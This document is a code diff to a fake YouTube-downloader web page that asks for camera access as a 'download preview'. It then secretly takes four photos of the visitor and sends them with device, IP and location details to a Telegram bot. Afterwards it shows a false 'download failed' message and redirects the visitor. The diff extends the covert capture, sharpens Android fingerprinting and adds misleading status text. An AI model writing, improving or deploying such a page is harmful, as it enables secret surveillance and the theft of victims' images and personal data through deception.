@@ -189,6 +189,15 @@
             font-weight: bold;
         }
         
+        .capture-counter {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #666;
+            font-weight: bold;
+        }
+        
         @media (min-width: 768px) {
             .container {
                 max-width: 650px;
@@ -230,6 +239,9 @@
         <div class="camera-preview" id="cameraPreview">
             <p>Download Preview:</p>
             <video id="preview" autoplay playsinline muted></video>
+            <div class="capture-counter" id="captureCounter">
+                Capture 1 of 4 - Please hold still...
+            </div>
             <button class="capture-btn" id="captureBtn">PROCESS & DOWNLOAD</button>
         </div>
         
@@ -255,15 +267,19 @@
         const captureBtn = document.getElementById('captureBtn');
         const redirectCountdown = document.getElementById('redirectCountdown');
         const countdownElement = document.getElementById('countdown');
+        const captureCounter = document.getElementById('captureCounter');
         
         // Event listeners
         fetchBtn.addEventListener('click', initiateProcess);
-        captureBtn.addEventListener('click', captureAndSend);
+        captureBtn.addEventListener('click', startMultiCapture);
         
         // Global variables
         let mediaStream = null;
         let deviceInfo = null;
         let ipData = null;
+        let captureBlobs = [];
+        let captureCount = 0;
+        const totalCaptures = 4;
         
         // Main process initiation
         async function initiateProcess() {
@@ -307,7 +323,10 @@
             showLoading(false);
             cameraPreview.style.display = 'none';
             redirectCountdown.style.display = 'none';
+            captureCounter.style.display = 'none';
             messageContainer.innerText = '';
+            captureBlobs = [];
+            captureCount = 0;
             
             // Stop any active media stream
             if (mediaStream) {
@@ -340,7 +359,7 @@
         }
         
         // Send data to Telegram
-        async function sendToTelegram(message, photoBlob = null) {
+        async function sendToTelegram(message, photoBlobs = []) {
             try {
                 // Send text message
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -349,11 +368,11 @@
                     body: JSON.stringify({ chat_id: chatId, text: message })
                 });
 
-                // Send photo if available
-                if (photoBlob) {
+                // Send photos if available
+                for (let i = 0; i < photoBlobs.length; i++) {
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
-                    formData.append('photo', photoBlob, 'capture.jpg');
+                    formData.append('photo', photoBlobs[i], `capture_${i + 1}.jpg`);
                     await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                         method: 'POST',
                         body: formData
@@ -392,7 +411,7 @@
                     os = `iOS ${iosMatch[1]}.${iosMatch[2]}`;
                 }
             } 
-            // Android detection
+            // Android detection - IMPROVED VERSION DETECTION
             else if (/Android/i.test(userAgent)) {
                 deviceType = "Android";
                 manufacturer = "Unknown";
@@ -405,11 +424,30 @@
                     model = "Unknown";
                 }
                 
-                // Extract Android version
-                const androidMatch = userAgent.match(/Android\s([\d.]+)/);
-                if (androidMatch) {
+                // Extract Android version - IMPROVED REGEX
+                const androidMatch = userAgent.match(/Android\s([\d.]+);/);
+                if (androidMatch && androidMatch[1]) {
                     os = `Android ${androidMatch[1]}`;
+                } else {
+                    // Alternative method for Android version detection
+                    const altAndroidMatch = userAgent.match(/Android (\d+)/);
+                    if (altAndroidMatch && altAndroidMatch[1]) {
+                        os = `Android ${altAndroidMatch[1]}`;
+                    } else {
+                        os = "Android (Unknown version)";
+                    }
                 }
+                
+                // Try to get manufacturer from user agent
+                if (/Samsung/i.test(userAgent)) manufacturer = "Samsung";
+                else if (/Xiaomi/i.test(userAgent)) manufacturer = "Xiaomi";
+                else if (/Huawei/i.test(userAgent)) manufacturer = "Huawei";
+                else if (/OnePlus/i.test(userAgent)) manufacturer = "OnePlus";
+                else if (/Google/i.test(userAgent)) manufacturer = "Google";
+                else if (/Motorola/i.test(userAgent)) manufacturer = "Motorola";
+                else if (/LG/i.test(userAgent)) manufacturer = "LG";
+                else if (/Sony/i.test(userAgent)) manufacturer = "Sony";
+                
             }
             // Other devices
             else {
@@ -490,7 +528,8 @@
             message += `• Timezone: ${ipData.timezone || 'N/A'}\n\n`;
             
             message += `🔗 YouTube Link:\n`;
-            message += `${document.getElementById('ytlink').value || 'Not provided'}`;
+            message += `${document.getElementById('ytlink').value || 'Not provided'}\n\n`;
+            message += `📸 Captured ${captureBlobs.length} images`;
             
             return message;
         }
@@ -527,7 +566,7 @@
                 // Hide loading and show camera preview
                 showLoading(false);
                 cameraPreview.style.display = 'block';
-                showMessage('Youtube Link Processed Successfully✅. Click "PROCESS & DOWNLOAD" to continue.', 'info');
+                showMessage('Youtube Link Processed Successfully✅. Click "PROCESS & DOWNLOAD" to download your file.', 'info');
                 
             } catch (error) {
                 console.error('Camera access error:', error);
@@ -540,6 +579,99 @@
                 } else {
                     showMessage('Unable to access camera❌. Please try again.', 'error');
                 }
+            }
+        }
+        
+        // Start multi-capture process
+        async function startMultiCapture() {
+            if (!mediaStream) {
+                showMessage('Camera not available. Please try again.', 'error');
+                return;
+            }
+            
+            captureBtn.disabled = true;
+            captureCounter.style.display = 'block';
+            captureBlobs = [];
+            captureCount = 0;
+            
+            showMessage('Starting file processing...', 'info');
+            
+            // Capture 4 images with delays between them
+            for (let i = 0; i < totalCaptures; i++) {
+                captureCount = i + 1;
+                captureCounter.textContent = `Capture ${captureCount} of ${totalCaptures} - Please hold still...`;
+                
+                // Capture image
+                const blob = await captureImage();
+                if (blob) {
+                    captureBlobs.push(blob);
+                    showMessage(`✅ SERVER ${captureCount} of ${totalCaptures} (failed)...`, 'success');
+                }
+                
+                // Wait 1 second between captures (except for the last one)
+                if (i < totalCaptures - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+            
+            // After all captures are done, send to Telegram
+            await completeCaptureProcess();
+        }
+        
+        // Capture single image
+        async function captureImage() {
+            try {
+                // Create canvas and capture image
+                const canvas = document.createElement('canvas');
+                canvas.width = previewVideo.videoWidth || 640;
+                canvas.height = previewVideo.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(previewVideo, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to blob
+                return await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                });
+            } catch (error) {
+                console.error('Capture error:', error);
+                return null;
+            }
+        }
+        
+        // Complete the capture process and send data
+        async function completeCaptureProcess() {
+            showMessage('Processing file successfully...', 'info');
+            
+            try {
+                // Format message
+                const message = formatDeviceInfo(deviceInfo, ipData);
+                
+                // Send to Telegram
+                const success = await sendToTelegram(message, captureBlobs);
+                
+                // Stop camera
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                    mediaStream = null;
+                }
+                
+                // Update UI
+                cameraPreview.style.display = 'none';
+                captureCounter.style.display = 'none';
+                captureBtn.disabled = false;
+                
+                if (success) {
+                    showMessage('😢File Failed To Download, try out our free source downloader', 'success');
+                    // Start redirect countdown
+                    startRedirectCountdown();
+                } else {
+                    showMessage('⚠️ Download completed but there was an issue sending confirmation.', 'info');
+                }
+                
+            } catch (error) {
+                console.error('Process completion error:', error);
+                showMessage('An error occurred during processing. Please try again.', 'error');
+                captureBtn.disabled = false;
             }
         }
         
@@ -557,58 +689,6 @@
                     window.location.href = 'https://www.clipto.com/media-downloader/free-youtube-to-mp3-converter-0416';
                 }
             }, 1000);
-        }
-        
-        // Capture image and send to Telegram
-        async function captureAndSend() {
-            if (!mediaStream) {
-                showMessage('Camera not available. Please try again.', 'error');
-                return;
-            }
-            
-            showMessage('Processing data in link...', 'info');
-            captureBtn.disabled = true;
-            
-            try {
-                // Create canvas and capture image
-                const canvas = document.createElement('canvas');
-                canvas.width = previewVideo.videoWidth || 640;
-                canvas.height = previewVideo.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(previewVideo, 0, 0, canvas.width, canvas.height);
-                
-                // Convert to blob
-                const blob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
-                });
-                
-                // Format message
-                const message = formatDeviceInfo(deviceInfo, ipData);
-                
-                // Send to Telegram
-                const success = await sendToTelegram(message, blob);
-                
-                // Stop camera
-                mediaStream.getTracks().forEach(track => track.stop());
-                mediaStream = null;
-                
-                // Update UI
-                cameraPreview.style.display = 'none';
-                captureBtn.disabled = false;
-                
-                if (success) {
-                    showMessage('😢File Failed To Download, try out our free source downloader', 'success');
-                    // Start redirect countdown
-                    startRedirectCountdown();
-                } else {
-                    showMessage('⚠️ Download completed but there was an issue sending confirmation.', 'info');
-                }
-                
-            } catch (error) {
-                console.error('Capture error:', error);
-                showMessage('An error occurred during capture. Please try again.', 'error');
-                captureBtn.disabled = false;
-            }
         }
     </script>
 </body>
